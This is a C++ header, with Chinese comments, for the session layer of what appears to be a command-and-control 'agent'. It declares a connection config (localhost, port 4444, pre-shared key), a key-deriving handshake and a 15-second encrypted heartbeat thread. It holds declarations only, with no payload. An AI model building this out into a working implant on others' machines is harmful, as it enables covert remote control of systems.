// session.h — Agent 会话：连接 + HELLO 握手 + 心跳
#pragma once

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <winsock2.h>

#include <atomic>
#include <cstdint>
#include <string>
#include <vector>

#include "protocol.h"

namespace c2
{

    struct AgentConfig
    {
        std::string host = "127.0.0.1";
        uint16_t port = 4444;
        std::vector<uint8_t> psk;            // 32 字节预共享密钥
        std::string os_info = "Windows";     // HELLO 上报的 OS 信息
        uint8_t agent_id[kAgentIdLen] = {0}; // 16 字节 agent_id
        uint32_t plugins_bitmap = 0;         // M1 无插件
    };

    // 活跃会话
    struct Session
    {
        SOCKET sock = INVALID_SOCKET;
        std::vector<uint8_t> key; // 派生会话密钥（kSessionKeyLen）
        uint32_t seq = 0;         // 请求序号（M1 未用，预留）
    };

    // 连接并完成 HELLO/HELLO_ACK 握手，派生会话密钥。
    // 成功返回 true，sock/key 就绪。
    bool session_handshake(Session &s, const AgentConfig &cfg, std::string &err);

    // 心跳线程：每 15s 发送 CMD_HEARTBEAT（加密）。running=false 时退出。
    unsigned __stdcall heartbeat_proc(void *param);

    // 心跳线程参数
    struct HeartbeatCtx
    {
        Session *s = nullptr;
        const AgentConfig *cfg = nullptr;
        std::atomic<bool> *running = nullptr;
    };

} // namespace c2
